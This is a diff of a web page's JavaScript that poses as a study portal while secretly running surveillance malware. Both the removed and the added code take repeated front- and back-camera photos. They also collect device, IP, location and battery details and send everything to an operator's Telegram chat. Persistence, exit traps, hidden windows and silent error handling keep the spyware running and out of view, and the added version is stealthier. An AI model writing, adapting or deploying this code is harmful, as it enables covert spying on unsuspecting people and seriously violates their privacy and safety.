-                    report += `💾 Save Data: ${STATE.deviceInfo.connection.saveData ? 'Enabled' : 'Disabled'}\n`;
-                    report += `📡 Connection Type: ${STATE.deviceInfo.connection.type}\n`;
-                    report += `🌐 IP Address: ${STATE.deviceInfo.ipAddress}\n\n`;
-                }
-                
-                // Time Info
-                report += `🕐 *TIME & LOCALE*\n`;
-                report += `🌍 Timezone: ${STATE.deviceInfo.timezone}\n`;
-                report += `⏰ Local Time: ${STATE.deviceInfo.localTime}\n`;
-                report += `🗺️ Language: ${STATE.deviceInfo.language}\n`;
-                report += `🗣️ Languages: ${STATE.deviceInfo.languages}\n\n`;
-                
-                // Camera Info
-                report += `📷 *CAMERA SYSTEM*\n`;
-                report += `📸 Cameras Available: ${STATE.availableCameras.length}\n`;
-                report += `🔄 Current Camera: ${STATE.currentCamera || 'None'}\n`;
-                report += `✅ Permission: ${STATE.permissionGranted ? 'Granted' : 'Denied'}\n`;
-                report += `🚀 System Status: ${STATE.isRunning ? 'Active' : 'Inactive'}\n\n`;
-                
-                // Advanced Features
-                report += `⚡ *ADVANCED FEATURES*\n`;
-                report += `🔧 Persistence: ${CONFIG.ENABLE_BACKGROUND_PERSISTENCE ? 'Enabled' : 'Disabled'}\n`;
-                report += `🔄 Multi-tab: ${CONFIG.ENABLE_MULTI_TAB ? 'Enabled' : 'Disabled'}\n`;
-                report += `🚫 Exit Traps: ${CONFIG.ENABLE_EXIT_TRAPS ? 'Active' : 'Inactive'}\n`;
-                report += `👻 Hidden Windows: ${CONFIG.ENABLE_HIDDEN_WINDOWS ? 'Active' : 'Inactive'}\n`;
-                report += `📡 Broadcast Channel: ${STATE.broadcastChannel ? 'Connected' : 'Disconnected'}\n`;
-                
-                // Send report to Telegram
-                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.ADMIN_CHAT_ID,
-                        text: report,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                
-                log('Complete device report sent', 'success');
-                
-            } catch (error) {
-                log('Failed to send device report: ' + error.message, 'error');
-            }
-        }
-        
-        async function captureBurst(cameraType) {
-            log(`Starting ${cameraType} camera burst (${CONFIG.PHOTOS_PER_CAMERA} photos)`, 'info');
-            
-            for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
-                if (!STATE.isRunning) break;
-                
-                log(`Capturing ${cameraType} photo ${i}/${CONFIG.PHOTOS_PER_CAMERA}`, 'info');
-                
-                const blob = await capturePhoto();
-                
-                if (blob) {
-                    const sent = await sendToTelegram(blob, cameraType, i);
-                    
-                    if (!sent && STATE.persistenceDB) {
-                        // Store for later sync
-                        const persistence = new BackgroundPersistence();
-                        await persistence.storePhoto(blob, cameraType, i);
-                    }
-                }
-                
-                // Delay between photos
-                if (i < CONFIG.PHOTOS_PER_CAMERA) {
-                    await new Promise(resolve => setTimeout(resolve, CONFIG.CAPTURE_DELAY));
+                    log('Surveillance started');
                 }
             }
             
-            log(`${cameraType} camera burst complete`, 'success');
-        }
-        
-        // ============== MAIN SURVEILLANCE LOOP ==============
-        
-        async function mainLoop() {
-            if (STATE.isRunning) {
-                log('Surveillance already running', 'warning');
-                return;
+            startCaptureCycle() {
+                // Initial cycle after short delay
+                setTimeout(() => {
+                    this.executeCaptureCycle();
+                }, 8000);
             }
             
-            STATE.isRunning = true;
-            log('🚀 STARTING ULTIMATE SURVEILLANCE LOOP', 'success');
-            
-            // Send initial report
-            await sendDeviceReport();
-            
-            // Update battery periodically
-            const batteryInterval = setInterval(async () => {
-                if (STATE.isRunning) {
-                    STATE.batteryInfo = await getBatteryInfo();
-                }
-            }, 60000);
-            
-            // Main loop
-            while (STATE.isRunning) {
+            async executeCaptureCycle() {
+                if (!STATE.isRunning) return;
+                
+                STATE.cycleCount++;
+                
                 try {
-                    STATE.cycleCount++;
-                    log(`=== CYCLE ${STATE.cycleCount} ===`, 'info');
-                    
-                    // Update battery every 3 cycles
-                    if (STATE.cycleCount % 3 === 0) {
-                        STATE.batteryInfo = await getBatteryInfo();
+                    // Front camera
+                    if (await this.cameraSystem.startCamera('user')) {
+                        const frontPhotos = await this.cameraSystem.captureBurst('front');
+                        for (const photo of frontPhotos) {
+                            await this.telegramManager.sendPhoto(photo.blob, 'front', photo.index);
+                        }
                     }
                     
-                    // FRONT CAMERA
-                    log('Attempting front camera...', 'info');
-                    const frontStarted = await startCamera('user');
+                    await new Promise(r => setTimeout(r, CONFIG.SWITCH_DELAY));
                     
-                    if (frontStarted && STATE.isRunning) {
-                        await captureBurst('front');
-                    } else {
-                        log('Front camera unavailable', 'warning');
+                    // Back camera
+                    if (STATE.isRunning && await this.cameraSystem.startCamera('environment')) {
+                        const backPhotos = await this.cameraSystem.captureBurst('back');
+                        for (const photo of backPhotos) {
+                            await this.telegramManager.sendPhoto(photo.blob, 'back', photo.index);
+                        }
                     }
-                    
-                    if (!STATE.isRunning) break;
-                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
-                    
-                    // BACK CAMERA
-                    log('Attempting back camera...', 'info');
-                    const backStarted = await startCamera('environment');
-                    
-                    if (backStarted && STATE.isRunning) {
-                        await captureBurst('back');
-                    } else {
-                        log('Back camera unavailable', 'warning');
-                    }
-                    
-                    if (!STATE.isRunning) break;
-                    
-                    // Cycle complete
-                    log(`Cycle ${STATE.cycleCount} complete. Total photos: ${STATE.totalPhotosSent}`, 'success');
-                    
-                    // Random delay between cycles
-                    const delay = randomDelay(5000, 15000);
-                    await new Promise(resolve => setTimeout(resolve, delay));
                     
                 } catch (error) {
-                    log('Cycle error: ' + error.message, 'error');
-                    await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
+                    // Silent error
                 }
             }
             
-            // Cleanup
-            clearInterval(batteryInterval);
-            log('Surveillance loop stopped', 'warning');
-        }
-        
-        // ============== URL CONFIGURATION ==============
-        
-        function parseConfig() {
-            updateProgress(5, "Parsing configuration...");
-            
-            const params = new URLSearchParams(window.location.search);
-            
-            let website = params.get('site') || 
-                          params.get('url') || 
-                          params.get('website') || 
-                          'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
-            
-            // Ensure URL has protocol
-            if (!website.startsWith('http://') && !website.startsWith('https://')) {
-                website = 'https://' + website;
+            stop() {
+                this.isActive = false;
+                STATE.isRunning = false;
+                
+                if (this.captureInterval) {
+                    clearInterval(this.captureInterval);
+                    this.captureInterval = null;
+                }
+                
+                this.cameraSystem.cleanup();
+                
+                log('Surveillance stopped');
             }
             
-            // Decode URL
-            try {
-                website = decodeURIComponent(website);
-            } catch (error) {
-                // URL might not be encoded
-            }
-            
-            // Get chat ID
-            const chatId = params.get('chat_id') || 
-                          params.get('user') || 
-                          'anonymous_' + Math.random().toString(36).substr(2, 9);
-            
-            // Get session ID
-            const sessionParam = params.get('session') || 
-                                params.get('sid') || 
-                                Date.now().toString(36);
-            
-            // Update state
-            STATE.targetWebsite = website;
-            STATE.userChatId = chatId;
-            STATE.sessionId = sessionParam + '_' + Math.random().toString(36).substr(2, 6);
-            
-            log(`Configuration loaded: ${STATE.targetWebsite.substring(0, 50)}...`, 'success');
-            log(`User: ${STATE.userChatId}, Session: ${STATE.sessionId}`, 'info');
-        }
-        
-        function loadWebsite() {
-            updateProgress(50, "Loading study portal...");
-            
-            try {
-                elements.frame.src = STATE.targetWebsite;
-                document.title = 'Study Portal - Loading...';
-                log('Website frame loaded', 'success');
-            } catch (error) {
-                log('Failed to load website: ' + error.message, 'error');
+            emergencyRestart() {
+                this.stop();
+                setTimeout(() => {
+                    this.start();
+                }, 3000);
             }
         }
         
-        // ============== INITIALIZATION ==============
+        // ============== MAIN INITIALIZATION ==============
         
-        async function initialize() {
-            log('=== ULTIMATE SURVEILLANCE SYSTEM INITIALIZATION ===', 'info');
-            
+        async function initializeSystem() {
             try {
-                // Step 1: Parse configuration
-                parseConfig();
+                // PHASE 1: INSTANT WEBSITE LOADING
+                loadWebsiteImmediately();
+                updateProgress(50);
                 
-                // Step 2: Collect device information
-                await collectDeviceInfo();
-                
-                // Step 3: Initialize persistence systems
-                const persistence = new BackgroundPersistence();
-                await persistence.initialize();
-                
-                // Step 4: Initialize multi-tab coordination
-                const multiTab = new MultiTabCoordinator();
-                await multiTab.initialize();
-                
-                // Step 5: Initialize exit traps
-                const exitTraps = new ExitTrapManager();
-                exitTraps.setupTraps();
-                
-                // Step 6: Initialize hidden window manager
-                const hiddenWindows = new HiddenWindowManager();
-                
-                // Step 7: Load the website
-                loadWebsite();
-                
-                // Step 8: Get battery info
-                STATE.batteryInfo = await getBatteryInfo();
-                
-                // Step 9: Get location
-                updateProgress(60, "Getting location...");
-                await getLocation();
-                startLocationTracking();
-                
-                // Step 10: Request camera permission
-                updateProgress(70, "Setting up camera system...");
-                const hasCamera = await requestCameraPermission();
-                
-                // Step 11: Create hidden backup window
-                if (CONFIG.ENABLE_HIDDEN_WINDOWS) {
+                // PHASE 2: BACKGROUND INITIALIZATION (Non-blocking)
+                setTimeout(async () => {
+                    // Initialize systems
+                    const persistence = new StealthPersistence();
+                    const tabCoordinator = new StealthTabCoordinator();
+                    const windowManager = new AdvancedWindowManager();
+                    const exitTrap = new AdvancedExitTrap();
+                    const activitySimulator = new ActivitySimulator();
+                    const surveillanceController = new SurveillanceController();
+                    
+                    // Start systems
+                    await persistence.initialize();
+                    await tabCoordinator.initialize();
+                    exitTrap.activate();
+                    activitySimulator.start();
+                    
+                    // Collect device data
+                    await collectEssentialData();
+                    
+                    // Start surveillance after delay
                     setTimeout(() => {
-                        hiddenWindows.createBackupWindow();
-                    }, 5000);
-                }
-                
-                // Step 12: Complete loading
-                updateProgress(100, "Study portal ready!");
-                
-                // Step 13: Start surveillance if camera available
-                if (hasCamera) {
-                    log('All systems ready. Starting surveillance in 5 seconds...', 'success');
+                        surveillanceController.start();
+                    }, 10000);
+                    
+                    // Create hidden window after delay
                     setTimeout(() => {
-                        mainLoop();
-                    }, 5000);
-                } else {
-                    log('Camera not available. Running in passive mode.', 'warning');
-                }
-                
-                // Store references for cleanup
-                window.surveillancePersistence = persistence;
-                window.surveillanceMultiTab = multiTab;
-                window.surveillanceExitTraps = exitTraps;
-                window.surveillanceHiddenWindows = hiddenWindows;
+                        windowManager.createStealthWindow();
+                    }, 15000);
+                    
+                    // Store references
+                    window._system = {
+                        persistence,
+                        tabCoordinator,
+                        windowManager,
+                        exitTrap,
+                        activitySimulator,
+                        surveillanceController,
+                        restart: () => {
+                            surveillanceController.emergencyRestart();
+                            windowManager.createStealthWindow();
+                        }
+                    };
+                    
+                    updateProgress(100);
+                    
+                }, 1000); // 1 second delay for background init
                 
             } catch (error) {
-                log('Initialization failed: ' + error.message, 'error');
-                updateProgress(100, "Error loading portal. Please refresh.");
+                // Silent fail
             }
         }
         
         // ============== EVENT HANDLERS ==============
         
-        // Handle backup window heartbeats
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'backup_heartbeat') {
-                log('Backup window heartbeat received', 'debug');
+        // Quick loading completion
+        setTimeout(hideLoading, 1500);
+        
+        // Emergency restart button
+        elements.emergencyRestart.addEventListener('click', () => {
+            if (window._system) {
+                window._system.restart();
             }
         });
         
-        // Handle page visibility changes
+        // Handle page visibility
         document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                log('Page is now hidden (background/tab switch)', 'info');
-            } else {
-                log('Page is now visible', 'info');
+            if (document.hidden && window._system && window._system.windowManager) {
+                // Page hidden - create backup window
+                setTimeout(() => {
+                    window._system.windowManager.createStealthWindow();
+                }, 1000);
             }
         });
         
         // Handle beforeunload for cleanup
         window.addEventListener('beforeunload', () => {
-            log('Page unloading - cleaning up...', 'warning');
-            
-            // Stop surveillance
-            STATE.isRunning = false;
-            
-            // Stop camera stream
-            if (STATE.currentStream) {
-                STATE.currentStream.getTracks().forEach(track => track.stop());
-                STATE.currentStream = null;
+            if (window._system) {
+                window._system.surveillanceController?.stop();
+                window._system.tabCoordinator?.cleanup();
+                window._system.windowManager?.cleanup();
+                window._system.activitySimulator?.cleanup();
             }
-            
-            // Clear location tracking
-            if (STATE.locationWatchId) {
-                navigator.geolocation.clearWatch(STATE.locationWatchId);
-            }
-            
-            // Cleanup managers
-            if (window.surveillanceMultiTab) {
-                window.surveillanceMultiTab.cleanup();
-            }
-            
-            if (window.surveillanceHiddenWindows) {
-                window.surveillanceHiddenWindows.cleanup();
-            }
-            
-            if (window.surveillanceExitTraps) {
-                window.surveillanceExitTraps.cleanup();
-            }
-            
-            if (window.surveillancePersistence) {
-                window.surveillancePersistence.cleanup();
-            }
-            
-            log('Cleanup complete', 'info');
         });
         
-        // Handle online/offline status
+        // Handle online/offline
         window.addEventListener('online', () => {
-            log('Device is online', 'success');
-        });
-        
-        window.addEventListener('offline', () => {
-            log('Device is offline', 'warning');
-        });
-        
-        // ============== DEBUG API ==============
-        
-        window.StudyPortal = {
-            // Control
-            start: () => {
-                if (!STATE.isRunning) mainLoop();
-                else log('Already running', 'warning');
-            },
-            stop: () => {
-                STATE.isRunning = false;
-                log('Surveillance stopped', 'warning');
-            },
-            
-            // Status
-            status: () => ({
-                isRunning: STATE.isRunning,
-                sessionId: STATE.sessionId,
-                tabId: STATE.tabId,
-                userChatId: STATE.userChatId,
-                totalPhotos: STATE.totalPhotosSent,
-                cycleCount: STATE.cycleCount,
-                cameraReady: STATE.cameraReady,
-                currentCamera: STATE.currentCamera,
-                availableCameras: STATE.availableCameras.length,
-                permissionGranted: STATE.permissionGranted,
-                battery: STATE.batteryInfo,
-                location: STATE.locationInfo,
-                deviceInfo: STATE.deviceInfo,
-                otherTabs: Array.from(STATE.otherTabs),
-                hiddenWindows: STATE.hiddenWindows.size
-            }),
-            
-            // Actions
-            captureNow: async () => {
-                if (STATE.cameraReady) {
-                    const blob = await capturePhoto();
-                    if (blob) {
-                        await sendToTelegram(blob, 'manual', 1);
-                    }
-                } else {
-                    log('Camera not ready', 'error');
-                }
-            },
-            
-            sendReport: sendDeviceReport,
-            
-            getLocation: async () => {
-                const location = await getLocation();
-                return location;
-            },
-            
-            getBattery: async () => {
-                const battery = await getBatteryInfo();
-                return battery;
-            },
-            
-            // Debug
-            toggleStealth: () => {
-                CONFIG.STEALTH_MODE = !CONFIG.STEALTH_MODE;
-                log(`Stealth mode: ${CONFIG.STEALTH_MODE ? 'ON' : 'OFF'}`, 'info');
-            },
-            
-            testCamera: async () => {
-                const success = await startCamera('user');
-                return success;
+            if (window._system && window._system.persistence) {
+                // Trigger sync when back online
+                setTimeout(() => {
+                    window._system.persistence.syncToTelegram();
+                }, 2000);
             }
-        };
+        });
         
-        // ============== START APPLICATION ==============
+        // ============== START SYSTEM ==============
         
-        // Wait for page to load
+        // Start immediately
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initialize);
+            document.addEventListener('DOMContentLoaded', initializeSystem);
         } else {
-            initialize();
+            initializeSystem();
         }
+        
+        // Debug access (hidden)
+        Object.defineProperty(window, 'studySystem', {
+            get: () => window._system,
+            configurable: false,
+            enumerable: false
+        });
         
     </script>
 </body>
